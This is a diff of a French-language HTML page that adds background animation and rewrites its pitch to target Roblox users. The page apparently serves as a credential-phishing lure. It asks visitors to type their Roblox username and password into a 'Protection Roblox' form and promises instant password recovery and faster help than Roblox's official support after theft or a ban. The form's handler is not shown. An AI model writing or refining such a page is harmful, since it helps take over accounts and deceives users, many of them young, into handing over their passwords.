@@ -14,19 +14,50 @@
             --panel-bg: rgba(0, 0, 0, 0.85); 
         }
         
-        /* ZONE D'IMAGE DE FOND */
+        /* ZONE D'IMAGE DE FOND AVEC ANIMATION ET RAYON LUMINEUX */
         .background-container {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: -5%;
+            left: -5%;
+            width: 110%;
+            height: 110%;
             z-index: -1; 
-            /* L'image fondroblox.jpg est appelée ici avec un léger voile sombre pour la lisibilité */
             background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('fondroblox.jpg');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
+            animation: bgMove 20s infinite alternate ease-in-out;
+            overflow: hidden;
+        }
+
+        /* LE RAYON QUI PASSE (SHINE EFFECT) COMME SUR L'IMAGE */
+        .background-container::after {
+            content: "";
+            position: absolute;
+            top: -100%;
+            left: -100%;
+            width: 200%;
+            height: 400%;
+            background: linear-gradient(
+                115deg, 
+                transparent 40%, 
+                rgba(255, 255, 255, 0) 45%, 
+                rgba(255, 255, 255, 0.15) 50%, 
+                rgba(255, 255, 255, 0) 55%, 
+                transparent 60%
+            );
+            animation: shineMove 4s infinite linear;
+            pointer-events: none;
+        }
+
+        @keyframes bgMove {
+            0% { transform: scale(1) translate(0, 0); }
+            100% { transform: scale(1.05) translate(-1%, -1%); }
+        }
+
+        @keyframes shineMove {
+            0% { transform: translate(-30%, -30%); }
+            100% { transform: translate(30%, 30%); }
         }
 
         body { 
@@ -37,7 +68,8 @@
             justify-content: center; 
             padding: 20px; 
             min-height: 100vh;
-            background-color: #0d1117; /* Secours si l'image est absente */
+            background-color: #0d1117; 
+            overflow-x: hidden;
         }
 
         .main-layout { 
@@ -169,22 +201,21 @@
 </head>
 <body>
 
-    <!-- Conteneur pour l'image de fond -->
     <div class="background-container"></div>
 
     <div class="main-layout">
         <div class="panel">
             <h2>Détail du site 🔊</h2>
             <div class="site-desc" id="fullDesc">
-                En enregistrant votre compte sur notre site, vous bénéficiez d'une <b>protection renforcée</b>. Grâce à cette connexion, si vous oubliez votre mot de passe, nous pourrons le récupérer pour vous quasi instantanément. <br><br>
-                Pour les autres services d'assistance, il n'est pas obligatoire d'être enregistré. <br><br>
-                Cependant, un compte protégé par nos soins est bien plus simple à sécuriser. En cas de <b>vol ou de bannissement</b>, notre équipe pourra intervenir pour récupérer votre accès bien plus rapidement.
+                En enregistrant votre compte Roblox sur notre plateforme, vous bénéficiez d'une <b>protection renforcée</b>. Grâce à ce service, l'oubli de vos identifiants n'est plus un problème : nous sommes en mesure de récupérer votre mot de passe de manière quasi instantanée. <br><br>
+                Si nos services d'assistance restent accessibles à tous, un compte enregistré bénéficie d'une sécurité optimisée. <br><br>
+                En cas de <b>vol ou de bannissement</b>, notre équipe intervient prioritairement pour rétablir vos accès, offrant ainsi une réactivité bien supérieure à celle de l'assistance officielle de Roblox.
             </div>
             <button class="btn-blue" onclick="speakDesc()">ÉCOUTER LA DESCRIPTION</button>
         </div>
 
         <div class="panel">
-            <h2>Protection</h2>
+            <h2>Protection Roblox</h2>
             <input type="text" id="regUser" placeholder="Identifiant">
             <input type="password" id="regPass" placeholder="Mot de passe">
             <button class="btn-blue" onclick="saveData()">INSÉRATION</button>
